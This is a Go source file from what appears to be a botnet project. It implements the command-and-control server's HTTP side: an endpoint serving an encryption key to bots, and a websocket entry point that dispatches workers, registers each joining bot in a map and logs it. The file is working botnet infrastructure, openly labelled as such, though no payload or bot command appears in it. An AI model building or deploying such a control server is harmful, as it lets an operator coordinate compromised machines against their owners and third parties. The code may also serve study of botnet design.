package ccserver

import (
	"encoding/json"
	"log"
	"net/http"

	"github.com/adrianosela/botnet/command-and-control/ccworker"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/gorilla/mux"
)

// NewCommandAndControlService returns a new command and control server
// wrapped in an http handler
func NewCommandAndControlService() http.Handler {
	cc, err := NewCommandAndControl()
	if err != nil {
		log.Fatalf("could not create new command and control: %s", err)
	}

	router := mux.NewRouter()
	// exposes a public key for bots to encrypt commands before sending
	router.Methods(http.MethodGet).Path(protocol.KeyEndpoint).HandlerFunc(cc.KeyHTTPHandler)
	// accepts new bots and handles all communication to bots
	router.Methods(http.MethodGet).Path(protocol.CCEndpoint).HandlerFunc(cc.CommandAndControlHTTPHandler)

	return router
}

// KeyHTTPHandler serves the CC server's public key
func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Request) {
	ccDiscoveryBytes, err := json.Marshal(&protocol.CCDiscovery{Key: cc.msgEncryptKey})
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not return command and control discovery struct"))
		return
	}
	w.WriteHeader(http.StatusOK)
	w.Write(ccDiscoveryBytes)
	return
}

// CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
	// dispatch a new worker to handle the underlying botnet communication protocol
	bot, err := ccworker.DispatchNewBot(w, r, cc.msgDecryptKey, cc.recvMsgChan)
	if err != nil {
		w.WriteHeader(http.StatusTeapot)
		w.Write([]byte(":("))
		log.Printf(" [cmd&ctrl] there was a failed bot dispatch for %s: %s", r.RemoteAddr, r.UserAgent())
		return
	}
	// add bot to global map of bot workers
	cc.bots[bot.ID] = bot
	log.Printf("[cmd&ctrl] bot %s joined net", bot.ID)
}
